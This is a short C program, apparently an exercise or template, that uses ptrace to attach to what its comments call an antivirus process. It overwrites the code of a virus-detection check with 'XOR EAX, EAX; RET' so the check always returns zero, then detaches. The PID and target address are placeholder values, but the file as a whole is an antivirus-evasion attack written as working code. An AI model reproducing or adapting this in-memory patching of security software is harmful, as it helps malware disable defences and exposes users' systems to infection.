#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


int pid = 0x12345678;
int check_if_virus_got_address = 0x11111111;
int some_code = 0x22222222;

int main() {   
    // Try to attach to antivirus process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)==-1){
        perror("Attach");
        return -1;
    }

    // Waiting for the son process to stop 
    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)){      // WIFEXITED(status) : returns true if the child terminated normally.
        perror("waitpit failed");
        return -1;
    }

    // Replacing the code with "XOR EAX, EAX; RET;"
    if(ptrace(PTRACE_POKETEXT, pid ,check_if_virus_got_address, 0xc3c031)== -1){
        perror("Assemblu switch failed");
        return -1;
    }
    

    // Detach from antivirus process
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL)==-1){
        perror("Detach");
        return -1;
    } 
    return 0;
}
